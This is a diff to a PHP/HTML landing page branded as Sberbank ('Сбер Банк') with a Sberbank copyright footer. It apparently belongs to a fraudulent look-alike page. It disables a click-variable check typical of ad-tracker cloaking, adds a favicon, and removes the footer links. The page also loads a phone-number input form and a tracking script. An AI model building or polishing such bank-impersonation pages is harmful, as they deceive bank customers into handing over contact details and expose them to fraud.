@@ -1,7 +1,7 @@
 <?php
-if (!isset($rawClick) && !isset($click)) {
-  die();
-}
+// if (!isset($rawClick) && !isset($click)) {
+//   die();
+// }
 ?>
 
 <!DOCTYPE html>
@@ -11,6 +11,11 @@ if (!isset($rawClick) && !isset($click)) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Сбер Банк</title>
     <link rel="stylesheet" href="./assets/css/styles.css" />
+    <link
+      rel="shortcut icon"
+      href="./assets/img/icons/favicon.png"
+      type="image/x-icon"
+    />
     <script src="form/js/libs/intlTelInput.js"></script>
 
     <script type="application/javascript" src="track.js?v=21238"></script>
@@ -197,9 +202,9 @@ if (!isset($rawClick) && !isset($click)) {
       </div>
       <div class="footer__info--mobile">
         <span class="footer__text"
-          ><a href="">Политика обработки данных</a></span
+          >Политика обработки данных</span
         >
-        <span class="footer__text"><a href="">www.sberbank.ru</a></span>
+        <span class="footer__text">www.sberbank.ru</span>
         <span class="footer__text">© 2025 ПАО «Сбербанк»</span>
       </div>
     </footer>
